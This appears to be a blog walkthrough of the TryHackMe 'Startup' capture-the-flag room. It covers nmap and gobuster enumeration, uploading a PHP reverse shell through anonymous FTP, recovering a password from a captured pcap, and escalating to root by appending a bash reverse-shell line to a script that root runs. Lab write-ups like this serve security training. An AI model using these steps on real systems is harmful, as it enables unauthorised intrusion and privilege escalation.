<p>Startup is a Tryhackme room which is focused on file-upload vulnerability. The final objective is to get the user and the root flag</p>

## <ins>Finding the secret recipe</ins>
---
First up is enumeration.
<br>
<pre>nmap -T4 -sV -sC -vv --min-rate=100000 10.10.10.208</pre>
<br>
![nmap_scan](/assets/img/tryhackme/startup/nmap_scan.png)
<br>
From the nmap scan we can see that Anonymous login is allowed in ftp service.
<br>
![ftp_login](/assets/img/tryhackme/startup/3.png)
<br>
I saw two files and a folder. The text file is just a message and there was no information in the image. Even inside the folder there was nothing...I was like.."then why is the ftp service even open".

Then I tried enumerating the http service and found this in the source page.
<br>
![home_page_comment](/assets/img/tryhackme/startup/2.png)
<br>
It didn't make any sense so, I used gobuster to bruteforce the directories.
<br>
![gobuster](/assets/img/tryhackme/startup/4.png)
<br>
![hint](/assets/img/tryhackme/startup/5.png)
<br>
I saw the hint and found that the dir is the same as the folder in ftp service.
<br>
![ftp_http](/assets/img/tryhackme/startup/8.png)
<br>
Get a copy of php reverse shell and change the ip and the port values. In Kali linux the php reverse shell can be found in the location ```/usr/share/webshells/php/php-reverse-shell.php```
<br>
![reverse_shell](/assets/img/tryhackme/startup/6.png)

<br>
So, I logged into the ftp service again and uploaded the php reverse shell in the /ftp directory.
<br>
<pre>put file-name</pre>
<br>
![upload](/assets/img/tryhackme/startup/7.png)
<br>
If you go to the /ftp directory in the webpage you can see the reverse shell.
<br>
![reverse_shell_page](/assets/img/tryhackme/startup/9.png)

Open a netcat listener and click on the reverse shell.
<br>
![shell](/assets/img/tryhackme/startup/10.png)
<br>

The answer to the first question can be found in the text file located in the root("/") directory.
<br>

<br>

## <ins>User flag</ins>
---
Use the find command to get more information about the files that can be much use.
<br>
<pre>find / -user www-data 2>/dev/null</pre>
<br>
![find1](/assets/img/tryhackme/startup/12.png)
<br>
Go to the folder and download the file by running this on the remote machine
<br>
<pre>python -m SimpleHTTPServer 8080</pre>
<br>
And this on the local machine
<br>
<pre>wget http://remote-machine-ip:8080/file-name.pcapng</pre>
<br>

In this file, I found the password for the username **lennie**.
<br>
<pre> strings file-name.pcapng</pre>
<br>
![passwd_lennie](/assets/img/tryhackme/startup/13.png)
<br>
Log in with the username lennie using ```su lennie```

We can get the user flag from the home directoy of lennie
<br>
![user_flag](/assets/img/tryhackme/startup/14.png)
<br>

## <ins>Root flag</ins>
---
I found nothing useful in the directory ```/Documents```.
But inside the /scripts directory I saw a interesting file.
<br>
![planner_script](/assets/img/tryhackme/startup/15.png)
<br>

From the image we can see that the file is owned by root and it executes another file. This file is owned by lennie.
<br>
![print_script](/assets/img/tryhackme/startup/16.png)

So, it seems that ```planner.sh``` (which cannot be edited by lennie) runs ```print.sh``` (which can be edited by lennie). So root shell can be obtained by editing the print.sh file.

Append the reverse shell payload into the print.sh file
<br>
<pre> echo "bash -i /dev/tcp/your-vpn-ip-addr/4444 0>&1" >> /etc/print.sh</pre>
<br>

Open a netcat listener in your local machine and execute the planner script using ```sudo ~/scripts/planner.sh```

<br>
![root_flag](/assets/img/tryhackme/startup/17.png)
<br>

There we go!!! Root flag obtained.

That's it folks. Happy Hacking!!!
